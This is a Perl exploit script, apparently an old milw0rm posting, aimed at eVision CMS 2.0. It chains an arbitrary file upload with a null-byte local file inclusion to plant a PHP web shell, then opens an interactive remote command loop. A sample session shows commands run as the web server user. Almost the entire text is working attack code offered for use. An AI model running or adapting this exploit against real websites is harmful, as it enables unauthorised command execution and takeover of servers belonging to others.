#!/usr/bin/perl

# -----------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------

# eVision CMS 2.0
# http://kent.dl.sourceforge.net/sourceforge/e-vision/eVision-2.0.tar.gz
# Remote Command Execution Exploit
# by Osirys
# osirys[at]live[dot]it
# Greets to: evilsocket, DarkJoker, emgent, Jay and str0ke

# This cms is vulnerable to arbitrary file upload. The problem is that when
# the user uploads a file, on it will be added the .gif extension. but this
# cms is vulnerable to Local File Inclusion,so we can include the .gif file
# and execute it.

# ------------------------------------------------------------------
# Exploit in action :D
# ------------------------------------------------------------------
# osirys[~]>$ perl rcE.txt http://localhost/eVision-2.0/
#
#  ---------------------------
#    eVision CMS RCE Exploit
#        Coded by Osirys
#  ---------------------------

# [+] Evil php code uploaded !
# [+] Including now evil file with LFI vulnerability
# [+] Injection succesfully ! Remote Command execution works !

# shell[localhost]$> whoami
# apache
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/eVision-2.0/modules/tour/adminpart
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# ------------------------------------------------------------------

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $img_up_path = "/modules/brandnews/adminpart/img_upload.php";
my $up_path     = "/modules.conf/brandnews/showpart/icons/";
my $lfi_path    = "/modules/tour/adminpart/addtour.php?module=";
my $rce_path    = "../../../modules.conf/brandnews/showpart/icons/";
my $vuln_code   = "<?php system(\$_GET[cmd]); ?>";
my $lfile       = "osi.txt";
my $nfile       = "osirys.txt";
my $host        = $ARGV[0];


($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

open ($file, ">>", $lfile);
print $file "$vuln_code\n";
close($file);

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


my $url = $host.$img_up_path;
my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url,
                                Content_Type => 'form-data',
                                Content      => [
                                                   upload_img => [$lfile, Content_Type => 'text/plain'],
                                                   upload_label => $nfile,
                                                   upload_submit => 'Upload'
                                                ]
                     );

unlink($lfile);

if ($re->is_success){
    my $t_re = get_req($host.$up_path.$nfile.".gif");
    if ($t_re =~ /<\?php/) {
        print "[+] Evil php code uploaded !\n";
        print "[+] Including now evil file with LFI vulnerability\n";
        my $re = get_req($host.$lfi_path.$rce_path.$nfile.".gif%00&cmd=id");
        if ($re =~ /uid/) {
            print "[+] Injection succesfully ! Remote Command execution works !\n\n";
            $lfi_rce = $host.$lfi_path.$rce_path.$nfile.".gif%00&cmd=";
            &exec_cmd;
        }
        else {
            print "[-] Something goes wrong !\n";
            print "[-] Exploit Failed\n\n";
            exit(0);
        }
    }
    else {
        print "[-] Upload failed\n";
        print "[-] Exploit Failed\n\n";
        exit(0);
    }
}
else {
    print "[-] Unable to upload evil file !\n";
    print "[-] Exploit Failed\n\n";
    exit(0);
}

sub exec_cmd {
    my @outs;
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = ($lfi_rce.$cmd);
    $re = get_req($exec_url);
    if ($re =~ /(.)/) {
        push(@outs,$re);
        foreach my $o(@outs) {
            print "$o";
        }
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub banner {
    print "\n".
          "  --------------------------- \n".
          "    eVision CMS RCE Exploit   \n".
          "        Coded by Osirys       \n".
          "  --------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-02-02]